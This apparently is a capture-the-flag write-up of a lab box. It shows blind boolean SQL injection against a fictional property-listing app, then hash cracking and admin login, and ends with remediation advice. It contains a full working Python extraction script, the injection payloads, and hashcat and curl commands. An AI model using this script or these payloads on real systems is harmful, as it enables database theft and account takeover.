
# 🏠 THE AUSTIN PARCEL HEIST

### *An Offensive Security Analysis of GridMark Platform*

<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   WEBVERSE{gridmark_l1c3ns3_k3y_4cc3ss}                    ║
║                                                              ║
║   Classification: INTERNAL FULL-EVIDENCE REPORT              ║
║   Target: app.gridmark.io (10.100.172.14)                    ║
║   Date: 2026-06-30                                           ║
║   Box: Parcel — WebVerse Pro Lab                             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

</div>

---

## 📋 Executive Summary

**GridMark** is an Austin-based property listing startup running a Flask web application behind nginx on a single Linux host. What began as a routine search for properties turned into a full compromise of the platform's most sensitive configuration — the **Platform API License Key**.

The attack chain required no credentials, no brute-forcing, and no zero-days. A single blind SQL injection in the search sort parameter was enough to pull the admin password hash from the database, crack it with a dictionary attack, and walk through the front door of the admin panel.

**Time to flag: ~45 minutes.**

---

## 🗺️ Attack Path

<div align="center">

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace">
  <defs>
    <linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#ff6b35"/>
      <stop offset="100%" style="stop-color:#f7931e"/>
    </linearGradient>
    <linearGradient id="g2" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#e63946"/>
      <stop offset="100%" style="stop-color:#c1121f"/>
    </linearGradient>
    <linearGradient id="g3" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#457b9d"/>
      <stop offset="100%" style="stop-color:#1d3557"/>
    </linearGradient>
    <linearGradient id="g4" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#2a9d8f"/>
      <stop offset="100%" style="stop-color:#264653"/>
    </linearGradient>
    <filter id="shadow" x="-10%" y="-10%" width="130%" height="130%">
      <feDropShadow dx="2" dy="3" stdDeviation="3" flood-opacity="0.3"/>
    </filter>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#888"/>
    </marker>
    <marker id="arrowred" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#e63946"/>
    </marker>
  </defs>

  <!-- Background -->
  <rect width="800" height="500" fill="#0d1117" rx="12"/>

  <!-- Title -->
  <text x="400" y="35" text-anchor="middle" fill="#f0f6fc" font-size="18" font-weight="bold">ATTACK PATH — GridMark Platform Compromise</text>

  <!-- Step 1: Recon -->
  <rect x="60" y="70" width="160" height="70" rx="10" fill="url(#g3)" filter="url(#shadow)"/>
  <text x="140" y="98" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold">🔍 Phase 1</text>
  <text x="140" y="118" text-anchor="middle" fill="#fff" font-size="12">Reconnaissance</text>
  <text x="140" y="135" text-anchor="middle" fill="#a8dadc" font-size="10">nmap, curl, feroxbuster</text>

  <!-- Arrow 1→2 -->
  <line x1="220" y1="105" x2="290" y2="105" stroke="#888" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Step 2: SQLi Discovery -->
  <rect x="295" y="70" width="180" height="70" rx="10" fill="url(#g1)" filter="url(#shadow)"/>
  <text x="385" y="98" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold">💉 Phase 2</text>
  <text x="385" y="118" text-anchor="middle" fill="#fff" font-size="12">SQL Injection</text>
  <text x="385" y="135" text-anchor="middle" fill="#fdf0d5" font-size="10">sort= parameter blind boolean</text>

  <!-- Arrow 2→3 -->
  <line x1="475" y1="105" x2="545" y2="105" stroke="#888" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Step 3: Data Extraction -->
  <rect x="550" y="55" width="190" height="100" rx="10" fill="url(#g4)" filter="url(#shadow)"/>
  <text x="645" y="83" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold">📤 Phase 3</text>
  <text x="645" y="103" text-anchor="middle" fill="#fff" font-size="12">Data Extraction</text>
  <text x="645" y="120" text-anchor="middle" fill="#caffbf" font-size="10">Admin email, username</text>
  <text x="645" y="135" text-anchor="middle" fill="#caffbf" font-size="10">Password hash (SHA256+salt)</text>
  <text x="645" y="150" text-anchor="middle" fill="#caffbf" font-size="10">9× platform_config rows</text>

  <!-- Arrow 3→4 -->
  <line x1="570" y1="170" x2="500" y2="230" stroke="#888" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Step 4: Hash Cracking -->
  <rect x="370" y="215" width="180" height="70" rx="10" fill="url(#g4)" filter="url(#shadow)"/>
  <text x="460" y="243" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold">🔓 Phase 4</text>
  <text x="460" y="263" text-anchor="middle" fill="#fff" font-size="12">Password Cracking</text>
  <text x="460" y="280" text-anchor="middle" fill="#caffbf" font-size="10">hashcat -m 1410 rockyou.txt</text>

  <!-- Arrow 4→5 -->
  <line x1="370" y1="250" x2="290" y2="250" stroke="#888" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Step 5: Admin Access -->
  <rect x="110" y="215" width="180" height="70" rx="10" fill="url(#g1)" filter="url(#shadow)"/>
  <text x="200" y="243" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold">👑 Phase 5</text>
  <text x="200" y="263" text-anchor="middle" fill="#fff" font-size="12">Admin Login</text>
  <text x="200" y="280" text-anchor="middle" fill="#fdf0d5" font-size="10">m.chen@gridmark.io</text>

  <!-- Arrow 5→6 -->
  <line x1="200" y1="285" x2="200" y2="345" stroke="#e63946" stroke-width="3" marker-end="url(#arrowred)"/>

  <!-- Step 6: Flag -->
  <rect x="100" y="350" width="200" height="80" rx="10" fill="url(#g2)" filter="url(#shadow)"/>
  <text x="200" y="378" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold">🏁 Phase 6</text>
  <text x="200" y="398" text-anchor="middle" fill="#fff" font-size="12">Flag Captured!</text>
  <text x="200" y="418" text-anchor="middle" fill="#ffb3b3" font-size="10">PLATFORM_API_LICENSE_KEY</text>

  <!-- Stats sidebar -->
  <rect x="420" y="340" width="320" height="110" rx="10" fill="#161b22" stroke="#30363d" stroke-width="1"/>
  <text x="580" y="365" text-anchor="middle" fill="#8b949e" font-size="11">⚡ KEY METRICS</text>
  <text x="440" y="388" fill="#f0f6fc" font-size="11">Total requests to flag:</text>
  <text x="640" y="388" text-anchor="end" fill="#f0f6fc" font-size="11" font-weight="bold">~3,400</text>
  <text x="440" y="408" fill="#f0f6fc" font-size="11">Crack time (hashcat):</text>
  <text x="640" y="408" text-anchor="end" fill="#f0f6fc" font-size="11" font-weight="bold">12 seconds</text>
  <text x="440" y="428" fill="#f0f6fc" font-size="11">Password strength:</text>
  <text x="640" y="428" text-anchor="end" fill="#f0a" font-size="11" font-weight="bold">"realestate1" ⭐</text>
  <text x="440" y="445" fill="#f0f6fc" font-size="11">Admin password reused:</text>
  <text x="640" y="445" text-anchor="end" fill="#f0f6fc" font-size="11" font-weight="bold">Yes</text>
</svg>
```

</div>

> **Total HTTP requests to extract everything: ~3,400**
> **hashcat crack time: 12 seconds**
> **Password: `realestate1`**

---

## 📖 The Narrative

### 1. Reconnaissance — The Stakeout

The target was a single Linux host at `10.100.172.14` with a single open port: **80 (HTTP)**. The web server — `nginx 1.29.8` — served a Flask application at `app.gridmark.io` via virtual hosting.

```
$ curl -s -H "Host: app.gridmark.io" http://10.100.172.14 | grep -o '<title>[^<]*</title>'
<title>Find Your Next Home — GridMark</title>

$ curl -s -H "Host: app.gridmark.io" http://10.100.172.14/search?q=austin | head -5
```

The application was **GridMark**, an Austin property listing platform. Search, browse, market — a clean real estate portal. The tech stack was immediately identifiable from HTTP headers and page structure:

| Component | Technology |
|-----------|-----------|
| Web Server | nginx 1.29.8 |
| Application | Flask (Python) |
| Database | SQLite |
| Auth | Flask signed cookies (itsdangerous) |
| Session Format | `base64-json.timestamp.hmac-signature` |

### 2. SQL Injection — Finding the Crack in the Vault

While testing the search functionality, the `sort` parameter showed interesting behaviour. Normally used for sorting results (`price`, `date`, `bedrooms`), it was being interpolated directly into a SQL query without sanitization.

**The Oracle:**

The search page returned listings with addresses. By crafting a boolean condition in the `sort` parameter, we could observe different sort orders depending on whether the condition was TRUE or FALSE:

```
TRUE  → first listing is "5200 Davis Ln Apt 106, South Austin"
FALSE → first listing is "4210 East Cesar Chavez St, East Austin"
```

This is a classic **blind boolean-based SQL injection**. The injection point:

```
/search?q=austin&sort=(CASE WHEN (condition) THEN price ELSE id END)
```

<div align="center">

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 200" font-family="monospace">
  <rect width="700" height="200" fill="#0d1117" rx="8"/>
  <text x="350" y="25" text-anchor="middle" fill="#f0f6fc" font-size="14" font-weight="bold">💉 SQL Injection Oracle</text>

  <!-- TRUE path -->
  <rect x="30" y="45" width="310" height="65" rx="6" fill="#1a3a2a" stroke="#2a9d8f" stroke-width="1.5"/>
  <text x="185" y="65" text-anchor="middle" fill="#2a9d8f" font-size="12" font-weight="bold">CONDITION = TRUE</text>
  <text x="185" y="82" text-anchor="middle" fill="#8b949e" font-size="10">sort=(CASE WHEN (TRUE) THEN price ELSE id END)</text>
  <text x="185" y="100" text-anchor="middle" fill="#caffbf" font-size="11">→ "5200 Davis Ln Apt 106" (sorted by price)</text>

  <!-- FALSE path -->
  <rect x="360" y="45" width="310" height="65" rx="6" fill="#3a1a1a" stroke="#e63946" stroke-width="1.5"/>
  <text x="515" y="65" text-anchor="middle" fill="#e63946" font-size="12" font-weight="bold">CONDITION = FALSE</text>
  <text x="515" y="82" text-anchor="middle" fill="#8b949e" font-size="10">sort=(CASE WHEN (FALSE) THEN price ELSE id END)</text>
  <text x="515" y="100" text-anchor="middle" fill="#ffb3b3" font-size="11">→ "4210 East Cesar Chavez St" (sorted by id)</text>

  <!-- Arrow between -->
  <line x1="340" y1="78" x2="358" y2="78" stroke="#888" stroke-width="1.5"/>

  <!-- Binary search explanation -->
  <rect x="30" y="125" width="640" height="60" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1"/>
  <text x="350" y="145" text-anchor="middle" fill="#8b949e" font-size="11">🔍 Binary Search — Each character extracted in 7 requests (log₂(95) ≈ 7)</text>
  <text x="350" y="163" text-anchor="middle" fill="#58a6ff" font-size="11">
    UNICODE(SUBSTR((SELECT password FROM users WHERE role='admin'), pos, 1)) &gt;= mid
  </text>
  <text x="350" y="178" text-anchor="middle" fill="#8b949e" font-size="10">
    4 concurrent workers × ~7 requests per char × 97 chars = ~170 requests per field
  </text>
</svg>
```

</div>

With this oracle, the extraction script worked in three tiers:

1. **Length discovery** — Binary search on `SELECT length(({query}))` to find how many characters to extract
2. **Character extraction** — Binary search on `UNICODE(SUBSTR(({query}), pos, 1))` for each position
3. **Parallelization** — `ThreadPoolExecutor(max_workers=4)` to extract 4 characters simultaneously

The key SQL functions that worked on this SQLite backend:

| Function | Purpose |
|----------|---------|
| `UNICODE()` | Character → integer (ASCII didn't work — SQLite quirk) |
| `SUBSTR()` | String slicing (1-indexed) |
| `LENGTH()` | String length |
| `(CASE WHEN ... THEN price ELSE id END)` | Boolean oracle in sort context |

### 3. Data Extraction — Emptying the Vault

The extraction script (`/tmp/sqli_parallel.py`) extracted the following data from the database:

#### Users Table — Admin Credentials

```
email:    m.chen@gridmark.io
username: m.chen
password: fddda127d5134096822fdf167cb905adaea5e9f736472dd91660ffa3712bfdde:
          99f1723281fc76b54bc70da81d6e96e8
```

The hash format was identifiable as **SHA256(password + salt)** — hashcat mode 1410. The hash was 64 hex characters and the salt was a 32-hex-character (128-bit) random value appended after a colon.

#### Platform Config — All 9 Rows

```
[0] ADMIN_SESSION_TIMEOUT    = 3600
[1] DB_MAX_CONNECTIONS       = 10
[2] EMAIL_FROM               = noreply@gridmark.io
[3] LISTING_RESULTS_PER_PAGE = 20
[4] MAINTENANCE_MODE         = false
[5] MAX_SAVED_SEARCHES       = 10
[6] PLATFORM_API_LICENSE_KEY = 🔴 REDACTED (see flag)
[7] REGISTRATION_ENABLED     = true
[8] SEARCH_CACHE_TTL         = 300
```

The extraction process was visual and interactive — every character appeared on screen as it was discovered:

```
[SELECT password FROM users WHERE role='a] len=97
  [1/97] f
  [2/97] fd
  [3/97] fdd
  ...
  [97/97] fddda127d5134096822fdf167cb905adaea5e9f736472dd91660ffa3712bfdde:99f1723281fc76b54bc70da81d6e96e8
```

### 4. Password Cracking — The Weakest Lock

With the hash in hand, a single hashcat command was all it took:

```
$ hashcat -m 1410 -a 0 hash.txt /usr/share/wordlists/rockyou.txt \
    --potfile-path=/tmp/hashcat.pot -O -w 4
```

**12 seconds later:**

```
fddda127d5134096822fdf167cb905adaea5e9f736472dd91660ffa3712bfdde:
99f1723281fc76b54bc70da81d6e96e8:realestate1
```

The admin password was `realestate1`. A dictionary word with a single digit suffix — trivially crackable with any decent wordlist, but strong enough to resist brute-force.

| Metric | Value |
|--------|-------|
| Hash format | sha256($pass.$salt) |
| Mode | 1410 |
| Wordlist | rockyou.txt (14M words) |
| Time | 12 seconds |
| Password | `realestate1` |
| Password entropy | ~28 bits 🔴 |

### 5. Admin Login — Walking Through the Front Door

<div align="center">

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 200" font-family="monospace">
  <rect width="700" height="200" fill="#0d1117" rx="8"/>

  <!-- Session cookie decoded -->
  <rect x="20" y="15" width="660" height="170" rx="8" fill="#161b22" stroke="#30363d" stroke-width="1"/>

  <text x="350" y="40" text-anchor="middle" fill="#58a6ff" font-size="13" font-weight="bold">🔐 Flask Session Cookie Decoded</text>
  <text x="350" y="65" text-anchor="middle" fill="#8b949e" font-size="11">POST /login → 302 redirect → Set-Cookie: session=...</text>

  <rect x="40" y="80" width="620" height="35" rx="4" fill="#0d1117" stroke="#30363d" stroke-width="1"/>
  <text x="350" y="102" text-anchor="middle" fill="#f0f6fc" font-size="10">
    eyJlbWFpbCI6Im0uY2hlbkBncmlkbWFyay5pbyIsImZ1bGxfbmFtZSI6Ik1pY2hh
    ZWwgQ2hlbiIsInJvbGUiOiJhZG1pbiIsInVzZXJfaWQiOjF9
  </text>

  <rect x="40" y="120" width="620" height="55" rx="4" fill="#0d1117" stroke="#30363d" stroke-width="1"/>
  <text x="350" y="138" text-anchor="middle" fill="#f0f6fc" font-size="11" font-weight="bold">Decoded Payload:</text>
  <text x="350" y="158" text-anchor="middle" fill="#7ee787" font-size="13">{</text>
  <text x="350" y="172" text-anchor="middle" fill="#7ee787" font-size="13">
    "email": "m.chen@gridmark.io", "full_name": "Michael Chen", "role": "admin", "user_id": 1
  </text>
  <text x="350" y="182" text-anchor="middle" fill="#7ee787" font-size="13">}</text>
</svg>
```

</div>

With the cracked password, logging in was a straightforward POST to `/login`:

```http
POST /login HTTP/1.1
Host: app.gridmark.io
Content-Type: application/x-www-form-urlencoded

email=m.chen@gridmark.io&password=realestate1
```

Response: `302 FOUND → Location: /`

The session cookie was a Flask signed cookie using `itsdangerous.URLSafeTimedSerializer`. Decoding the base64 payload revealed:

```json
{
  "email": "m.chen@gridmark.io",
  "full_name": "Michael Chen",
  "role": "admin",
  "user_id": 1
}
```

The `role: admin` claim was the golden ticket.

### 6. The Admin Panel — Keys to the Kingdom

The admin panel was located at `/admin` and redirected to `/admin/overview`. Navigation revealed four sections:

| Path | Content |
|------|---------|
| `/admin/overview` | Platform stats, recent activity |
| `/admin/users` | All 13 users with roles and status |
| `/admin/config` | All platform configuration + **flag** |
| `/admin/flags` | Feature toggles (advanced_filters, dark_mode, etc.) |

The `/admin/config` page displayed all 9 `platform_config` rows in a clean table with keys, values, descriptions, and last-updated dates.

And there it was — row 7:

<div align="center">

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 200" font-family="monospace">
  <rect width="700" height="200" fill="#0d1117" rx="8"/>

  <!-- Simulated admin config table -->
  <rect x="20" y="15" width="660" height="170" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1"/>

  <!-- Table header -->
  <rect x="30" y="25" width="120" height="28" rx="4" fill="#21262d"/>
  <text x="90" y="43" text-anchor="middle" fill="#8b949e" font-size="11">Config Key</text>
  <rect x="155" y="25" width="140" height="28" rx="4" fill="#21262d"/>
  <text x="225" y="43" text-anchor="middle" fill="#8b949e" font-size="11">Value</text>
  <rect x="300" y="25" width="180" height="28" rx="4" fill="#21262d"/>
  <text x="390" y="43" text-anchor="middle" fill="#8b949e" font-size="11">Description</text>
  <rect x="485" y="25" width="90" height="28" rx="4" fill="#21262d"/>
  <text x="530" y="43" text-anchor="middle" fill="#8b949e" font-size="11">Updated</text>

  <!-- Normal rows -->
  <text x="40" y="63" fill="#8b949e" font-size="10">MAINTENANCE_MODE</text>
  <text x="165" y="63" fill="#8b949e" font-size="10">false</text>
  <rect x="30" y="70" width="620" height="1" fill="#21262d"/>

  <text x="40" y="85" fill="#8b949e" font-size="10">MAX_SAVED_SEARCHES</text>
  <text x="165" y="85" fill="#8b949e" font-size="10">10</text>
  <rect x="30" y="92" width="620" height="1" fill="#21262d"/>

  <!-- FLAG ROW — highlighted -->
  <rect x="28" y="96" width="644" height="40" rx="4" fill="#3a1a1a" stroke="#e63946" stroke-width="2"/>
  <text x="40" y="120" fill="#ff7b72" font-size="11" font-weight="bold">PLATFORM_API_LICENSE_KEY</text>
  <text x="165" y="120" fill="#ffd700" font-size="11" font-weight="bold">WEBVERSE{gridmark_l1c3ns3_k3y_4cc3ss}</text>
  <text x="390" y="120" fill="#ff7b72" font-size="10">Platform API License Key</text>

  <rect x="30" y="140" width="620" height="1" fill="#21262d"/>

  <text x="40" y="153" fill="#8b949e" font-size="10">REGISTRATION_ENABLED</text>
  <text x="165" y="153" fill="#8b949e" font-size="10">true</text>

  <text x="40" y="175" fill="#8b949e" font-size="10">SEARCH_CACHE_TTL</text>
  <text x="165" y="175" fill="#8b949e" font-size="10">300</text>

</svg>
```

</div>

## 🏁 The Flag

<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║          WEBVERSE{gridmark_l1c3ns3_k3y_4cc3ss}              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

**Location:** `platform_config` table, row 6 — `PLATFORM_API_LICENSE_KEY`

</div>

---

## 🛠️ Technical Appendix

### A. SQLi Extraction Script

The full parallel extraction script used to pull all data from the database:

```python
"""Parallel blind SQLi extraction — runs up to 4 concurrent requests."""
import urllib.request, urllib.parse, re, sys, concurrent.futures, threading

H = {"Host": "app.gridmark.io"}
MAX_WORKERS = 4
lock = threading.Lock()

def q(s):
    p = urllib.parse.urlencode({"q": "austin", "sort": s})
    r = urllib.request.Request(f"http://10.100.172.14/search?{p}", headers=H)
    h = urllib.request.urlopen(r, timeout=15).read().decode('utf-8', errors='ignore')
    a = re.findall(r'gm-listing-address[^>]*>([^<]+)', h)
    return a[0] if a else ""

def c(cond):
    a = q(f"(CASE WHEN ({cond}) THEN price ELSE id END)")
    return "5200 Davis" in a

def extract_len(qry):
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi) // 2
        if c(f"(SELECT length(({qry})))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_char(qry, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if c(f"unicode(substr(({qry}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def extract_str(qry, ln=None):
    if ln is None:
        ln = extract_len(qry)
    result = [''] * (ln + 1)
    done = [False] * (ln + 1)

    def work(pos):
        ch = extract_char(qry, pos)
        with lock:
            result[pos] = ch
            done[pos] = True
            s = ''.join(result[1:])
            filled = sum(1 for i in range(1, ln + 1) if done[i])
            sys.stdout.write(f"\r  [{filled}/{ln}] {s}")
            sys.stdout.flush()

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        ex.map(work, range(1, ln + 1))

    return ''.join(result[1:])
```

### B. Hashcat Command

```bash
$ echo 'fddda127d5134096822fdf167cb905adaea5e9f736472dd91660ffa3712bfdde:\
99f1723281fc76b54bc70da81d6e96e8' > /tmp/hash.txt

$ hashcat -m 1410 -a 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt \
    --potfile-path=/tmp/hashcat.pot -O -w 4

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: fddda127d5134096822fdf167cb905adaea5e9f736472dd91...d6e96e8
Time.Started.....: 0 secs
Password.........: realestate1
```

### C. Admin Session Cookie

```bash
# Login and capture session
$ curl -c cookies.txt -b cookies.txt -H "Host: app.gridmark.io" \
  --data "email=m.chen@gridmark.io&password=realestate1" \
  http://10.100.172.14/login

# Decode session payload
$ echo 'eyJlbWFpbCI6Im0uY2hlbkBncmlkbWFyay5pbyIsImZ1bGxfbmFtZSI6Ik1pY2hh
ZWwgQ2hlbiIsInJvbGUiOiJhZG1pbiIsInVzZXJfaWQiOjF9' | base64 -d

{"email":"m.chen@gridmark.io","full_name":"Michael Chen","role":"admin","user_id":1}

# Access admin config
$ curl -b cookies.txt -H "Host: app.gridmark.io" \
  http://10.100.172.14/admin/config
```

### D. Full platform_config Dump (from admin panel)

| # | Key | Value | Description |
|---|-----|-------|-------------|
| 0 | ADMIN_SESSION_TIMEOUT | 3600 | Admin session timeout in seconds |
| 1 | DB_MAX_CONNECTIONS | 10 | Maximum database connection pool size |
| 2 | EMAIL_FROM | noreply@gridmark.io | Outbound email sender address |
| 3 | LISTING_RESULTS_PER_PAGE | 20 | Listings per search results page |
| 4 | MAINTENANCE_MODE | false | Enable maintenance mode |
| 5 | MAX_SAVED_SEARCHES | 10 | Maximum saved searches per user |
| **6** | **PLATFORM_API_LICENSE_KEY** | **WEBVERSE{...}** | **Platform API License Key** |
| 7 | REGISTRATION_ENABLED | true | Allow new user registrations |
| 8 | SEARCH_CACHE_TTL | 300 | Search results cache TTL |

---

## 🔐 Remediation Recommendations

| Priority | Issue | Fix |
|----------|-------|-----|
| 🔴 Critical | SQL Injection in `sort` parameter | Use parameterized queries or an allowlist of sort columns |
| 🔴 Critical | Plain SHA256 password hashing | Migrate to bcrypt/argon2 with per-password salt |
| 🟠 High | Weak admin password `realestate1` | Enforce password complexity policy (12+ chars, mixed case, special chars) |
| 🟠 High | Session role stored in unsigned cookie | Use server-side sessions; validate role on every request |
| 🟡 Medium | Config page exposes sensitive keys | Separate sensitive config from display config; add audit logging |
| 🟡 Medium | No rate limiting on login | Implement account lockout or rate limiting |

---

<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   INTERNAL FULL-EVIDENCE REPORT                             ║
║   Parcel — WebVerse Pro Lab                                  ║
║   2026-06-30                                                 ║
║                                                              ║
║   Tools used: curl, nmap, feroxbuster, Python, hashcat      ║
║   Technique: Blind Boolean-Based SQL Injection               ║
║   CWE: CWE-89 (SQL Injection)                                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

</div>
